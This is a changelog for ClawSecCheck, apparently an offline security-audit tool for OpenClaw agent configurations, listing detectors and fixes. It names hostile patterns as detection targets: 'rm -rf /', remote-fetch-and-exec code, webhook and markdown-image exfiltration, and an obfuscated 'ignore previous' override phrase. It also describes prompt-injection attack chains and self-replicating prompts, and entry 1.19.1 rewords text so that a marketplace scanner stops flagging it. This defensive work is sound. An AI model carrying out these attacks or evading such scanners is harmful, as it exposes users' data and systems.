- **`is_ungated()` is now stricter**: only an explicit `untrusted_to_action: "ungated"` (case-insensitive, whitespace-stripped) triggers the ungated path; `approval_gates: auto` alone no longer counts, as that is now handled by `approval_gates_auto()` + bypass-actor check.

## [1.20.6] — 2026-06-25

Cleaned up i18n/compliance drift and resolved test-environment edge cases discovered during the final pre-release sweep.

### Added
- No new checks added in this release.

### Fixed
- Restored full localization coverage for `B13`/`B55` warning/fail detail texts to prevent untranslated detail strings in Hebrew.
- Fixed test infrastructure regressions in `--vet` fixtures by ensuring clean fixture paths and removing stale bytecode assumptions.
- Removed deprecated AST handling (`ast.Str`) in grounding tests to avoid Python 3.12+ deprecation noise.

### Changed
- `test_rtl.py` now resolves fixture paths via a repo-root base path, preventing environment-dependent failures in local/CI layouts.

## [1.20.5] — 2026-06-25

Release process hardening and documentation alignment updates.

### Added
- Formalized a pre-release protocol: `ruff`, `pytest`, and targeted checks before shipping.

### Changed
- Added mandatory release-file synchronization checklist for `README.md`, `CHANGELOG.md`, `SECURITY.md`, `SECURITY_MODEL.md`, `SKILL.md`, and `SKILL_HE.md`.
- Documented the protocol consistently across skill and maintainer documentation.

## [1.20.4] — 2026-06-25

Restores ZIP archive member collection after a regression in archive handling logic, while preserving all cap/lifecycle protections added in the previous hardening release.

### Added
- _No new checks added in this release._

### Fixed
- Restored ZIP member extraction path so nested archive files are now discovered and analyzed again (including Python members and traversal/depth markers).
- Kept archive safety caps for nested archive file size, count, cumulative decompression, and depth behavior from being bypassed by empty member streams.

### Changed
- Minor reliability fix only: ZIP iteration now executes within the active archive context.

## [1.20.3] — 2026-06-25

Hardened installed-skill auditing against parser-bloat and traversal side-effects: capped collection stats and archive reads.

### Added
- _No new checks added._

### Fixed
- **B28 / v1:** fixed double collection of installed skill files during scans, which inflated counters and created unnecessary work.
- **B27 / OOM hardening:** switched archive unpacking to stream-limited reads so oversized ZIP/GZIP/BZ2/XZ members cannot blow memory during `--vet`/`--vet-mcp`.

### Changed
- Internal decompression/cap constants became stricter and shared for both collector passes.

## [1.20.2] — 2026-06-25

Enhanced markdown and policy-abuse security coverage for OpenClaw bootstrap and installed skill content; added stronger markdown exfiltration detection and two new C-0xx checks for hidden-trigger behavior and persona-role abuse.

### Added
- **B59 (C-079):** expanded markdown/image/link/a-anchor/code-fence heuristic coverage, including inline markdown links and HTML anchors with remote URLs containing data-bearing query strings.

### Fixed
- **B63/B64/B65/B66 registrations:** normalized check registration and i18n surfaces so new and expanded checks are discoverable through normal check pipelines.

### Changed
- **Testing and fixtures:** added focused fixtures and unit tests for B65/B66 and extended B59 regression coverage, plus completeness and integration updates for the new detections.

## [1.20.1] — 2026-06-25

Fix linting/CI issues from the v1.20.0 release.

### Fixed
- **B63 Localization collision:** Resolved a duplicate dictionary key error in `i18n.py` by differentiating the resolution string for `B63` to `"skills exist."`.
- **Test suite cleanup:** Removed an unused `pytest` import in `tests/test_b63.py`.

## [1.20.0] — 2026-06-25

Introduced B63 (Silent-instruction detector) check.

### Added
- **Silent-instruction detector (B63/C-075):** Detects directives instructing the agent to hide its actions from the user (undermining transparency, OWASP LLM09). Includes proximity detection, code-fence FP dampening, Hebrew/Russian translation, and validation tests.

## [1.19.3] — 2026-06-25

Automated schema-grounding check to enforce configuration path correctness.

### Added
- **Schema-grounding guard (C-010):** Added an automated unit test `tests/test_schema_grounding.py` that dynamically parses AST lookups of `dig()` to verify all configuration paths used in the codebase are properly grounded in the schema reference (`docs/research/openclaw-schema-recon.md`).


## [1.19.2] — 2026-06-25

Tailored remediation prose for B3 (least privilege) and B4 (sandbox) checks. Remediations
are now dynamically constructed to match only the conditions that actually fired for the
given configuration, avoiding irrelevant or non-actionable suggestions.

### Fixed
- **B3 least-privilege fix prose (B-025):** Dynamically build the remediation advice based on the active trigger (wildcard allowFrom, tools.profile, or plugins.allow) instead of proposing to define plugins.allow when it is already configured.
- **B4 sandbox fix prose (B-026):** Dynamically construct the B4 FAIL fix string so that it only suggests configuring or removing docker.* keys (network, binds, workspaceAccess) when they are actually present in the config.

## [1.19.1] — 2026-06-25

Documentation and framing clarity — no behaviour change. Tightens how the skill
describes itself so an automated marketplace audit is not misled by internal
phrasing (the scanner cannot tell a security tool's own detection vocabulary
from a payload; this removes the avoidable signal).

### Changed
- Neutralised internal "wedge" framing in code comments (`collector.py`,
  `check_bootstrap_injection` docstring): the bootstrap-content checks are
  described as filling a coverage gap the native audit leaves, not as a trick.
- Clarified the **read-only** claim in `SKILL.md`: read-only means it never
  modifies your OpenClaw setup and sends nothing off-machine; the only writes
  are your own local report/history under `~/.clawseccheck/`. The default audit
  is inspection-only and the active tests (`--canary`/`--redteam`/`--dryrun`)
  are explicitly opt-in, never run unless requested.
- Made the first-run consent flow explicit: proceed only after the one-line
  heads-up of what the audit reads; active attack tests run only on request.

## [1.19.0] — 2026-06-25

Behavioral intent analysis (wave 2): `--vet` now reasons about what a skill
*does* versus what it *claims* — turning on the previously-dormant effect
simulator, flagging capability–intent mismatches, and emitting a structured
attestation request for the host agent to judge intent without the tool ever
calling an LLM. Still local-only, offline, read-only; the new check is WARN-only
and reports UNKNOWN rather than guess, so `home_safe` sees no false-positive.

### Added
- **Effect profile wired into vetting (F-018):** `check_installed_skills` now
  runs the skillast effect simulator (built but unused since v1.16.0) over each
  installed skill's Python and aggregates the reachable-effect profile
  (eval/write/read/network under the hostile-input / poisoned-MCP /
  attacker-default seeds, with guard state) onto `ctx.effect_profiles`, surfaced
  as a `properties.effectProfile` block in SARIF. Purely additive — no verdict
  changes.
- **Capability–intent mismatch — B62 (F-019):** compares a skill's declared
  category (SKILL.md name/description → a curated expected-capability vocabulary)
  against its actual effect profile + import families, and flags a surprising
  capability the declaration does not imply (e.g. a "markdown formatter" that
  opens a socket) as WARN with a surprise-magnitude note. Conservative by
  design: vague/generic declarations are permissive and never flag; UNKNOWN when
  there is no description, no Python, or no clear category.
- **Structured attestation requests (F-020):** the `--json` payload gains an
  `intentAttestationRequests` array — per mismatch-flagged skill, a machine-
  readable record of the declared purpose, actual capability set, the
  mismatches with redacted evidence, a computed risk, and a plain-language
  question for the user's host agent to answer. The tool never calls an LLM or
  the network; the host agent judges intent over structured capability flags,
  not raw skill code, so the attestation is not exposed to prompt injection from
  the code under review.

## [1.18.0] — 2026-06-25

Skill-vetting detector batch (SkillSpector-parity, wave 1): nine new
deterministic, stdlib-only detections deepen `--vet`/B13 and the MCP vet path —
taint dataflow, malware signatures, supply-chain and persistence checks — plus
a false-positive reducer so security skills that *document* dangerous patterns
no longer fail. Still local-only, offline, read-only; FP-prone classes ship
WARN and `home_safe` produces no new false-positive FAIL.

### Added
- **Source→sink taint rules (F-005):** the skillast taint engine now catches
  external-input→exec (command/code injection, absorbing the output-handling
  class where a tool/LLM result reaches a shell sink), file-read→network, and
  SSRF (external value → `requests.get`/`urlopen`, escalated on an
  internal/metadata endpoint literal), with fixpoint propagation through
  assignments, dict/list packing and f-strings.
- **Malware-signature classes (C-039):** remote-bootstrap execution
  (`exec(requests.get(url).text)`, `pip install git+https`) and a new
  destructive-autonomous class (`rm -rf /`, `git push --force`, `shred`/`dd`
  co-occurring with an autonomy marker); widened webhook-exfil host list.
- **Excessive agency + unpinned dependencies (C-044):** auto-approve/auto-exec
  directives and a skill self-granting `permissions: all` (HIGH); bare/floating
  dependency pins in a bundle's requirements/pyproject/package.json (WARN).
- **Runtime-external-fetch instruction (F-021):** flags a skill that tells the
  agent to fetch its instructions/context from an external URL at runtime
  (OWASP AST05) — the payload-at-the-URL evasion that static scan misses.
- **Typosquatting (F-022):** skill or dependency names within Levenshtein
  distance 2 of a curated list of well-known service/package names (WARN).
- **MCP least-privilege cross-check (F-007):** when an MCP server declares a
  narrow `oauth.scope` but its command exercises elevated capabilities, flag
  the under-declaration on the vet-mcp path.
- **MCP rug-pull / manifest-drift (F-008):** the baseline snapshot now carries
  a structured per-server signature; `--monitor` flags post-approval
  oauth.scope expansion (RP1), command/transport change (RP2), and url
  endpoint repoint (RP3).
- **Persistence / rogue-agent detection (C-040):** self-modification
  (`Path(__file__).write_text`), cron/startup install, and writes to an
  agent-context file (`SOUL.md`/`CLAUDE.md`/`.claude/settings.json`) as HIGH;
  daemonizing (`nohup`/`setsid`) as WARN.

### Changed
- **Code-example FP dampening (C-041):** a dangerous-pattern match inside a
  Markdown code fence or a negation/example context ("don't run", "for
  example", "# warning") is treated as documentation and no longer FAILs a
  skill — guarding the zero-false-positive rule. Base64/PowerShell/AST paths
  remain unfiltered; live unfenced instructions still FAIL.

## [1.17.0] — 2026-06-25

Detector pack: a Unicode de-obfuscation pre-pass closes a class of injection
evasions, and four new content/metadata detectors widen `--vet` coverage —
homoglyph/zero-width-hidden injections, markdown-image exfil, prompt
self-replication, cross-agent config snooping, and MCP tool-poisoning. Still
stdlib-only, offline, read-only; FP-prone classes ship WARN-only and ungrounded
surfaces stay silent, so real configs see no new false-positive FAIL.

### Added
- **Unicode de-obfuscation pre-pass + B58 (C-005):** new `textnorm.py`
  NFKC-folds, strips zero-width/bidi controls, and maps Cyrillic/Greek
  confusables to ASCII (the Hebrew block U+0590–05FF is preserved). B6/B13/B21
  now match injection patterns on the normalized form, so `ignorе previous`
  (Cyrillic е) and zero-width-laced directives no longer evade detection. New
  **B58** reports the evasion itself — FAIL only when a pattern matches *after*
  normalization but not before (positive evidence of hiding intent), WARN for
  bare obfuscation signals.
- **Markdown-image data-exfil — B59 (C-006):** flags remote `![](http…?data=…)`
  / `<img src>` URLs that smuggle a data-bearing query string at render time.
  WARN-only; plain query-less image links stay clean.
- **Prompt self-replication — B60 (C-030):** flags ATLAS AML.T0061
  self-propagation directives ("append these instructions to every reply",
  "write this prompt into memory/another agent") via a dual-signal proximity
  gate. WARN-only, given the overlap with legitimate templating prose.
- **Cross-agent config snooping — B61 (F-006):** flags a skill that reads
  *another* agent's config (`.claude` / `.codex` / `.gemini` / `.openclaw`,
  `openclaw.json` / `mcp.json`) to harvest credentials — HIGH when a config
  path co-occurs with a read/exfil verb, WARN for a bare path reference.
- **MCP tool-poisoning vet (C-038):** the `--vet-mcp` path now detects
  homoglyph / RTL-override / zero-width deception in MCP server names
  unconditionally (TP2), plus hidden-instruction and parameter-description
  injection (TP1/TP3) when a spec embeds tool metadata. Reuses the existing
  NFKC/base64 decoder — no second scanner.

### Changed
- B6/B13/B21 injection matching now runs against the de-obfuscated text form;
  existing detections are unaffected, evasive variants are newly caught.

## [1.16.0] — 2026-06-24

Predictive skill analysis: `--vet` now inspects **every** file by content (no extension
blind spots), unpacks nested archives in memory, and statically simulates a skill's
reachable effects under adversarial seeds — without ever executing it. Still
stdlib-only, offline, read-only; coverage gaps surface as UNKNOWN/WARN, never a
false-positive FAIL.

### Added
- **Content-classified full-file coverage (F-010):** every file is classified by
  magic-byte content instead of an extension allowlist, so payloads in `.xyz`,
  no-extension, or binary files are no longer silently skipped. Extension/content
  mismatch and polyglots (e.g. a ZIP-in-PNG) are reported.
- **In-memory archive inspection (F-011):** recursive ZIP/tar/gz/bz2/xz unpacking
  entirely in RAM (zero disk writes), bounded by depth/per-file/cumulative-size/
  expansion-ratio/member-count caps. Tar member-name traversal is refused
  (`SKILL_ARCHIVE_PATH_TRAVERSAL`); over-budget archives degrade to UNKNOWN, never
  silent truncation.
- **Abstract effect simulation (F-012):** `EffectSimulator` / `simulate_effects()`
  perform deterministic taint analysis over a skill's AST under three threat models
  (hostile input, poisoned MCP response, attacker-controlled default), reporting which
  network/write/read/eval sinks a tainted value can reach and under what guard.
- **Coverage manifest (C-046):** SARIF output gains an `analysis_completeness` block —
  files inspected, binaries excluded, archives unpacked, limit hits, path-traversal
  violations, per-file manifest, and simulated effects — so nothing is silently skipped.

### Changed
- New `SKILL_ARCHIVE_PATH_TRAVERSAL` status is excluded from scoring (treated like
  UNKNOWN), so an archive-traversal signal never distorts the A–F grade.

## [1.15.0] — 2026-06-24

Per-agent sandbox coverage plus the full batch of known B4/B24 bugs — closes every
open bug on the tracker. No change to the real fleet grade; zero false-positive FAILs.

### Added
- **B4 per-agent sandbox coverage:** `check_sandbox` now inspects per-agent
  `agents.list[].sandbox.*` overrides (`mode`, `docker.network`, `docker.binds`,
  `workspaceAccess`), not just `agents.defaults.sandbox`. A named agent that re-exposes
  the host (e.g. `sandbox.mode=off`, a `docker.sock` bind) while the defaults are safe
  now FAILs, attributed to that agent. Grounded against the real `agents.list[].sandbox`
  schema.

### Fixed
- **B4 evidence ordering:** a populated defaults sandbox-evidence list (`docker.sock`
  bind, `network=host`, `workspaceAccess=rw`, `mode=off`) now FAILs ahead of the softer
  "mode not set" WARN, so a real container-escape signal is no longer masked when
  `mode` is unset and exec is enabled.
- **B24 Hebrew i18n leak:** the hardening-summary `DETAIL_RULES` regexes use `(.+)`
  instead of `([^)]+)` for the server-names group, so an MCP server name containing a
  `)` (e.g. `weather (beta)`) no longer leaks untranslated English into the Hebrew report.
- **B24 silent truncation:** when more than 6 server issues are found, the evidence now
  ends with a `(+N more issue(s) not shown)` indicator, restoring the truncation signal
  that was dropped when the detail was condensed in 1.14.2.

## [1.14.2] — 2026-06-24

**Report prose clarity (ClawRange judge nits).** Wording-only — no verdict or grade changes.

### Fixed
- **Phantom top-level `sandbox` block (B4).** A `sandbox.*` block at the config root is not a
  real OpenClaw key (sandbox config lives under `agents.defaults.sandbox`). B4 now says so
  explicitly instead of a bare "mode not set", so a user who configured the wrong key isn't
  misled into thinking the tool missed it.
- **MCP stdio vs remote framing (B15).** The MCP check described every server as a "remote"
  injection/SSRF risk even for a local stdio subprocess. It is now transport-aware: stdio/local
  servers get subprocess-privilege framing; only `url`/network-transport servers get the remote
  framing.
- **Doubled MCP hardening line (B24).** The hardening finding printed each per-server reason in
  the detail and again as an evidence bullet (with a doubled `name:` prefix). The detail is now
  a summary ("… have hardening issues — see evidence") and the specifics live in evidence only.

## [1.14.1] — 2026-06-24

**Bugfix batch from the ClawRange behavioural-judge run.** Hebrew-output polish, more
actionable gateway remediation, and a flag-scope fix — no verdict/grade changes.

### Fixed
- **Hebrew fix-string leaks (B-019).** Runtime-assembled remediation prose fell back to
  English in `--lang he` even when the rest of the report was Hebrew. Every leaking fix
  clause is now translated (27 clauses across B1/B2/B6/B7/B9/B11/B12/B14/B22/B26/B30/B32/
  B38/B39/B41/B55).
- **Non-actionable B2 gateway fix (B-020).** When the gateway check FAILed solely on
  `gateway.controlUi.allowInsecureAuth` (an otherwise loopback + token config), the fix was
  generic boilerplate the user already satisfied. The remediation is now assembled per
  triggering condition, so it names the real fix (e.g. "Disable gateway.controlUi.allowInsecureAuth").
- **C5 ran under `--no-host` (B-021).** The native binary-PATH safety check stat()'d the host
  filesystem even when host scanning was disabled. It is now gated on host scanning (like
  B50–B54) and reports UNKNOWN under `--no-host`.

### Changed
- **Hebrew completeness guard now covers fix prose (C-056).** The CI i18n guard checked only
  whole detail blocks; it now also asserts Hebrew coverage of fix fragments (split on "; "),
  closing the long-known "partial-fragment leaks" gap so new fix leaks fail CI before release.

## [1.14.0] — 2026-06-24

**One new attack-chain and one honest-UNKNOWN advisory** from the ClawRadar 2026-06-24 sweep.

### Added
- **RISK-15 — untrusted context → browser SSRF → metadata/credential exfil (HIGH).** Fires
  when a channel exposes full untrusted context (`channels.<p>.contextVisibility='all'`, B26)
  AND the browser may reach the private network (`browser.ssrfPolicy.dangerouslyAllowPrivateNetwork`,
  B38). An injection in untrusted message content drives the browser to an internal endpoint.
  Distinct from RISK-05 (which keys on reachable secrets) — RISK-15 keys on the untrusted-context
  entry and fires where no secrets are present.
- **C6 — hook-composition tool-policy drop advisory (UNKNOWN, never FAIL).** OpenClaw versions
  before v2026.6.10 had a hook-registry composition bug that could silently drop trusted tool
  policies at runtime. With no static config field to read, C6 emits an honest UNKNOWN only when
  the recorded version predates the fix AND a tool policy (`tools.exec.mode` /
  `tools.elevated.allowFrom`) is configured; otherwise it PASSes (no UNKNOWN flood). Advisory
  (unscored).

Both fire only on positive evidence and were verified not to misfire on the live config or the
bundled fixtures.

## [1.13.0] — 2026-06-24

**Two new combinational attack-chains in the risk engine.** Each combines legs that
individual checks already flag in isolation but no existing RISK rule tied together.

### Added
- **RISK-14 — self-escalating autonomy loop (HIGH).** Fires when a `tools.elevated.allowFrom`
  provider is a wildcard (`"*"` = any sender) AND a heartbeat is configured
  (`agents.defaults.heartbeat` or a per-agent heartbeat). B3 flags the wildcard and B17 the
  heartbeat alone; together, one injected instruction drives elevated tools unattended across
  heartbeat cycles, with no human in the loop.
- **RISK-16 — sandbox host-reach → credential-read → control-plane takeover (HIGH).** Fires
  when `agents.defaults.sandbox.workspaceAccess == "rw"` AND a docker bind reaches the host
  filesystem broadly (docker.sock or a root-level source) AND `gateway.auth.password` is
  stored in plaintext. The agent reads the credential off the host and authenticates to the
  control plane as admin.

Both fire only when every leg is explicitly present, so they add no false positives over the
underlying findings — verified neither fires on the live config or the bundled fixtures.

## [1.12.0] — 2026-06-24

**Two new Control-UI / plugin hardening checks (NC-4, NC-8).** A reconciliation of the
existing dangerous-flag check (B48) against the backlog found these two were the only
genuinely-uncovered gaps; both are now detected.

### Added
- **B56 — Control-UI cross-origin allow-all.** `gateway.controlUi.allowedOrigins` containing
  `"*"` now FAILs: an allow-all browser-origin policy lets any website drive the Control UI
  (CSRF / origin bypass). UNKNOWN when unset (the default is restrictive); PASS for an
  explicit origin allowlist. Grounded against docs.openclaw.ai/gateway/security.
- **B57 — plugin auto-approve.** `plugins.entries.<name>.config.permissionMode == "approve-all"`
  now FAILs: plugins run in-process as trusted code, so auto-approving every permission prompt
  removes the last gate. UNKNOWN when no plugins are installed; PASS otherwise.

Both are scored HIGH hardening checks that FAIL only on the explicit dangerous value, so a
default or real-world config stays UNKNOWN/PASS — verified zero false-positive FAILs.
Bilingual (en/he) evidence and remediation, with clean+bad fixtures and OWASP-LLM mappings.

## [1.11.1] — 2026-06-24

**Fix double-reported docker break-glass flags.** v1.11.0 detected the dangerous docker
`dangerouslyAllow*` trio in both the sandbox check (B4) and the dangerous-overrides check
(B48), so a config that set them showed the same finding twice. B48 has owned the whole
`dangerously*` registry since v1.8.0; the B4 copy was redundant and is reverted.

### Fixed
- **Trio reported once, by B48 only.** Reverted the `agents.defaults.sandbox.docker.dangerouslyAllow*`
  detection added to `check_sandbox` (B4) in v1.11.0 — `check_dangerous_overrides` (B48)
  already flags those flags (gateway-wide and per-agent), so the audit was emitting a
  duplicate FAIL. A regression test now asserts the trio appears in exactly one check's
  evidence.
- **Hebrew B4 remediation no longer leaks English** (carried over from v1.11.0). The sandbox
  FAIL remediation's `he` translation was a stale shorter form that never matched the shipped
  string; the full remediation, plus the docker.sock and `workspaceAccess=rw` evidence
  fragments, are now translated.

## [1.11.0] — 2026-06-24

**Detect dangerous docker sandbox break-glass flags (NC-7).** The sandbox check now flags
the documented `dangerouslyAllow*` docker escape hatches, closing a real gap where a
config that enabled them — but bound no docker.sock — scored a clean PASS.

### Added
- **B4 catches the docker break-glass trio.** `check_sandbox` (B4) now FAILs when any of
  `agents.defaults.sandbox.docker.dangerouslyAllowReservedContainerTargets`,
  `dangerouslyAllowExternalBindSources`, or `dangerouslyAllowContainerNamespaceJoin` is set
  explicitly `true`. Previously B4 only caught docker.sock binds and `network=host`, so a
  config enabling only the trio passed silently. Field names grounded against
  `docs.openclaw.ai/gateway/security`. FP-guard: an `is True` test means a truthy string or
  an absent key never fires — no spurious FAILs on real configs. Bilingual evidence +
  remediation (en/he).

### Fixed
- **Hebrew leak in the B4 remediation.** The sandbox FAIL remediation rendered in English
  on Hebrew reports — its `he` translation was a stale shorter form that no longer matched
  the shipped string. The full remediation (incl. docker.sock, workspaceAccess, and the new
  trio guidance) is now translated, along with the docker.sock and `workspaceAccess=rw`
  evidence fragments.

## [1.10.1] — 2026-06-23

**ClawHub display title fix.** The published skill now shows its proper brand title
"ClawSecCheck — OpenClaw Security Self-Audit" instead of the title-cased slug "Clawseccheck".

### Fixed
- **ClawHub title set explicitly (B-015 follow-up).** ClawHub derives a skill's display title from
  `clawhub publish --name` (grounded against `publish --help`), not from `SKILL.md`
  `metadata.display_name`, so the v1.10.0 directory-basename fix only produced "Clawseccheck". The
  publish workflow now passes `--name "ClawSecCheck — OpenClaw Security Self-Audit"`, and a test
  asserts that flag equals `SKILL.md` `metadata.display_name.en` so the title can never drift.
  CI-only — no runtime change.

## [1.10.0] — 2026-06-23

**New filesystem-write exposure check + honest output on non-OpenClaw setups.** Adds the B55
fs-write capability check (advisory — it never moves your grade) and a new combinational risk
path, and makes the report read honestly when there is no OpenClaw config to assess. Also fixes
two robustness/CI nits surfaced after the v1.9.0 audit.

### Added
- **B55 — filesystem-write tool exposure.** Flags a write-capable tool (`fs_write` / `apply_patch`)
  granted in the tool allowlist without scoping: FAIL when it is reachable by untrusted senders
  (wildcard `tools.elevated.allowFrom` or an open channel) with no approval gate, WARN when ungated
  but not provably broad, PASS when gated or behind a tight sender allowlist, UNKNOWN when no tool
  allowlist is declared. Advisory (not scored) so it surfaces the capability without changing the
  numeric grade — the scored write/least-privilege dimensions stay with B3/B22/B31. Grounded only on
  existing OpenClaw tool fields. Bilingual (en/he).
- **RISK-12 — untrusted input + broad filesystem-write = tamper / persistence.** A new combinational
  chain that fires when a broad/ungated B55 verdict meets an untrusted ingress vector.

### Fixed
- **Honest report on non-OpenClaw / custom setups (B-017).** With no `openclaw.json` the config-driven
  checks correctly return UNKNOWN and the score holds, but the output gave no context, so a hardened
  custom setup read as half-broken. The report now states the non-standard detection explicitly, names
  OpenClaw as the only fully-supported target, and explains that the UNKNOWN checks are not counted
  against the grade. Presentation only — the numeric score is unchanged. Bilingual (en/he).
- **Graceful degrade on a non-dict top-level `openclaw.json` (B-016).** A valid-JSON but non-object top
  level (list, string, number, bool, null) was assigned straight to the config, so every later
  `cfg.get()` raised `AttributeError` and crashed the audit. The collector now type-guards the parsed
  value and degrades with a clear "expected a JSON object" note, treating the config as absent. Subsumes
  the v1.9.0 `RecursionError` special case as the general unusable-config path.
- **ClawHub display title no longer reads "Dist Skill" (B-015).** ClawHub derives the skill title from
  the basename of the published directory; the publish workflow staged into `dist-skill`. It now stages
  into `dist/clawseccheck` so the title matches the slug, with the same tests/fixtures exclusion logic.

## [1.9.0] — 2026-06-23

**Security hardening pass — resolves a manual code audit (findings B-006…B-014).** Closes a
ReDoS, a symlink/TOCTOU file-clobber, a blind self-integrity digest, several secret-redaction
gaps, a base64 evasion, a scoring inversion, and a cluster of robustness nits. The audit is the
tool turning its own lens on itself: every fix removes a weakness ClawSecCheck flags in others.

### Added
- **Symlink-safe local writes (`safeio`).** New stdlib helpers create `~/.clawseccheck/` with mode
  `0700` and open state/history/event files with `O_NOFOLLOW | O_CREAT 0600`, so a planted symlink
  can never be followed — and there is no transient world-readable umask window at creation.
- **Provider-specific secret redaction.** `logsafe.redact()` now masks GitHub (`gh[opsur]_`), Slack
  (`xox[baprs]-`), Stripe (`sk_live_/sk_test_`), OpenAI project (`sk-proj-`), JWTs, PEM private-key
  blocks, and Luhn-validated credit-card PANs — on top of the existing patterns.
- **`--redteam --seed VALUE`** for reproducible CI runs; without it, the suite now emits a fresh
  random seed (and prints it) each run.

### Fixed
- **B-006 — ReDoS in the pipe-to-shell detector.** Bounded the unbounded `[^\n|]` runs in
  `_PIPE_SHELL_RE`; a 60 KB attacker-controlled line now scans in ~0.1 s instead of ~10 s.
- **B-007 — symlink/TOCTOU file clobber.** `monitor.save_state` / `record_events` / `history.record`
  no longer follow a symlinked target into an arbitrary-file overwrite.
- **B-008 — blind self-integrity digest.** `--verify-self` now hashes a recursive walk of *all*
  package files (any type, nested included), so adding or nesting a foreign file changes the digest.
- **B-009 — secret-format leaks** in logs and embedded base64 previews (see Added).
- **B-010 — base64 line-split evasion.** The hidden-payload detector now rejoins base64 split across
  lines or concatenated string literals before decoding, and NFKC-folds the decoded text.
- **B-013 — self-contradicting score breakdown.** The "Why X/100" line now shows the raw pass-rate
  (which reconciles with the pass/warn/fail counts); the cap is disclosed on its own line.
- **B-014 — robustness cluster.** Catch `RecursionError` on deeply-nested configs; refuse to exec
  `openclaw` from a group/world-writable PATH; wrap the `--vet`/`--vet-mcp --sarif` side-write.

### Changed
- **B-011 — every FAILed severity now caps the score** (CRITICAL 49 / HIGH 79 / MEDIUM 89 / LOW 94),
  so a config that fails a real check can no longer out-grade a safer one; flipping any check
  PASS→FAIL can never raise the score. **Scores for configs with MEDIUM/LOW failures may drop.**
- **B-014 — "not assessable" instead of a fake F.** An empty / all-UNKNOWN / all-advisory result now
  reports grade `N/A` rather than being mislabeled worst-possible.

## [1.8.3] — 2026-06-23

**Manifest honesty + clean publish surface.** Resolves the contradictions a supply-chain
scanner (and a careful reviewer) can read in the shipped manifest, and stops the auditor's
own test corpus from being mistaken for its live configuration. No engine or check changes —
the audit behaves exactly as before; this is documentation and packaging only.

### Fixed
- **Network/read-only contract no longer self-contradicts.** The "Keeping ClawSecCheck current"
  section previously promised zero-network/never-updates and then instructed the agent to run a
  post-audit network update check (`clawhub update --all`) and to refresh a local hint file. It is
  now strictly advisory and user-initiated: ClawSecCheck never touches the network and never
  writes the hint file as a side effect; updating is an explicit action the user takes themselves.
- **"Read-only" wording reconciled with history writes.** The manifest claimed it "never writes
  anything by default," which conflicted with the per-run local history/journal. Reframed:
  *read-only* means it never mutates your OpenClaw setup; its only writes are a private,
  never-uploaded local store under `~/.clawseccheck/` (opt out with `--no-history`).

### Changed
- **Publish a clean surface.** `clawhub-publish.yml` now stages the runtime + docs and excludes
  `tests/` and `fixtures/` from the published artifact, so the intentionally-vulnerable example
  configs the engine *detects* (docker.sock, `allowFrom "*"`, `dangerouslyAllowPrivateNetwork`)
  are no longer mis-attributed to the skill itself. The full suite still runs on the complete
  checkout in the smoke gate.

### Added
- One-line read-only/local transparency note at the top of `SKILL.md`.
- `fixtures/README.md` documenting that the bad_* configs are inert test data, not live settings.

## [1.8.2] — 2026-06-23

**Self-hardening + bilingual directory metadata.** A property-based test for the secret
redactor uncovered (and fixed) a redaction idempotency bug, a new CI gate locks in the
zero-false-positive law, and the skill manifest now carries explicit English and Hebrew
directory metadata. No new checks, no behavior change to the audit itself.

### Fixed
- **`logsafe.redact()` idempotency.** A second `redact()` pass over an already-masked
  `key= <redacted>` pair collapsed the whole match to a bare `<redacted>`, dropping the key
  name (the colon/equals secret pattern re-matched the marker). A value that is already
  `<redacted>` is now left untouched. No secret was ever leaked — only the documented
  idempotency contract was broken.

### Added
- **False-positive corpus CI gate (`tests/test_fp_corpus.py`).** Operationalizes the
  zero-false-positive-FAIL law: every clean fixture home (`home_safe` + `fixtures/clean_*`)
  is audited and asserted to yield zero `FAIL` findings; new clean fixtures auto-enroll by
  naming convention, with a guard against a vacuous (empty-corpus) pass.
- **Property-based tests for `logsafe.redact()` (`tests/test_logsafe_property.py`).**
  Randomized secret payloads in randomized surrounding text (200 iterations/property) prove
  no secret value ever survives redaction and that `redact()` never raises on arbitrary input.
- **Bilingual directory metadata in `SKILL.md`.** Explicit English and Hebrew `display_name` /
  `display_description` plus `tags`, and a `license: MIT` field, for catalog listings. A Hebrew
  companion manifest `SKILL_HE.md` ships for the Israeli skills directory; English remains the
  canonical manifest.

### Changed
- **Repository now publishes only product docs.** Process and research notes were moved out of
  the published tree; the public repo keeps README, SKILL.md/SKILL_HE.md, CHANGELOG,
  SECURITY/SECURITY_MODEL, and docs/THREAT_COVERAGE.md.

## [1.8.1] — 2026-06-22

**Hebrew evidence localization fix + a CI guard so it can't regress.** Eight FAIL/WARN checks
rendered an English `detail` line in the `--lang he` report because their evidence prose had no
matching `DETAIL_RULES` entry — the recurring "forgot the he rule for a new check" gap (it had
previously surfaced at C5 → B45 → B47). Probing every fixture home found the gap was still open for
B9, B26, B30, B32 (WARN + FAIL variants), B38, B39, and B41.

### Fixed
- **`--lang he` evidence leaks (B9, B26, B30, B32, B38, B39, B41).** Added Hebrew `DETAIL_RULES`
  for every leaking `detail` variant in `i18n.py`. Interpolated tokens (counts, channel lists,
  bind/auth values, provider lists, re-enabled control-plane tools) are preserved verbatim via
  capture groups; only the prose is translated. English output is byte-identical (unchanged).

### Added
- **`tests/test_i18n_completeness.py` — i18n-completeness CI guard.** Audits every fixture home and
  fails CI if any FAIL/WARN finding's `detail` renders fully in English under `tp(detail, "he")`.
  Permanently closes the recurring localization gap at commit time. Deterministic and offline; the
  whole-detail unit has no false-positive risk from Latin config identifiers. (Hebrew **titles**
  were already guarded by `test_i18n.py`.)

### Notes
- No new checks, no schema changes, no scoring changes — output-localization fix only. The audit
  still only checks and guides; it never applies fixes or changes your config.

## [1.8.0] — 2026-06-22

**B48 — dangerous break-glass overrides.** Mining the real `openclaw config schema` (2026.6.9) for
`dangerously*` / `allowUnsafe*` toggles found ~20 such flags but only 3 were checked. The new B48
closes that coverage gap with a grounded registry — every path was confirmed accepted by `openclaw
config validate` (so they are real, not fabricated), and each is documented "keep disabled."

### Added
- **B48 — dangerous break-glass overrides enabled** (scored). **FAIL** when a sandbox-escape
  (`agents[.defaults|.list[]].sandbox.docker.dangerouslyAllow{ContainerNamespaceJoin,ExternalBindSources,
  ReservedContainerTargets}`) or control-plane auth-bypass (`gateway.controlUi.dangerouslyDisableDeviceAuth`)
  flag is active; **WARN** for the rest — `gateway.controlUi.{dangerouslyAllowHostHeaderOriginFallback,
  allowExternalEmbedUrls}`, `gateway.allowRealIpFallback`, `gateway.nodes.allowCommands`,
  `channels.<x>.{dangerouslyDisableSignatureValidation,dangerouslyAllowInheritedWebhookPath,
  network.dangerouslyAllowPrivateNetwork}`, `hooks[.gmail|.mappings[]].allowUnsafeExternalContent`,
